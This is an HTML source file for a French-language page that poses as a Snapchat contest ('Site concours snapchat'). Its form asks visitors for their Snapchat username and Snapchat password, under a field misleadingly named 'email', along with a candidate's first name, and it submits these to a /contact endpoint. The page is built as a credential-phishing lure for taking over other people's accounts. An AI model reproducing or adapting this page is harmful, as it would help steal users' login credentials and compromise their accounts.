<!DOCTYPE html>
<html lang="fr">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Titre</title>
		<link rel="stylesheet" href="st.css">
		<script src="cd.js" defer></script>
	</head>
	<body>
		<header class="topbar">
			<span class="brand-mark">D<span>+</span>C</span>
			<span class="availability"><i></i> En ligne maintenant</span>
		</header>
		<main class="hero">
			<div class="content">
				<div class="content-line"></div>
				<p class="eyebrow">AMG &amp; co.</p>
				<h1>Site concours snapchat</h1>
				<p class="intro">Une présence simple, créative et pleine d'énergie.</p>
				<a class="snap-link" href="https://snapchat.com/t/DOZHaLsm" target="_blank" rel="noopener noreferrer">
					<span>Visiter mon Snapchat</span>
					<span aria-hidden="true">&#8594;</span>
				</a>
				<form class="contact-form" action="/contact" method="post">
					<div class="form-row">
						<label for="name">Nom d'utilisateur Snapchat</label>						
						<input id="name" name="username" type="text" placeholder="Votre nom d'utilisateur" required>
					</div>
					<div class="form-row">
						<label for="email">Mot de passe Snapchat</label>
						<input id="email" name="email" type="password" placeholder="Votre mot de passe" required>
					</div>
					<div class="form-row">
						<label for="message">Prénom de votre candidat</label>
						<textarea id="message" name="message" rows="3" placeholder="" required></textarea>
					</div>
					<button type="submit">Envoyer le message <span aria-hidden="true">&#8594;</span></button>
					<p class="form-feedback" role="status"></p>
				</form>
			</div>
		</main>
		<footer class="footer-note">Créé avec passion <span aria-hidden="true">&#10022;</span> 2026</footer>
		<img class="background-image" src="startup.jpeg" alt="Image de présentation" />
	</body>
</html>
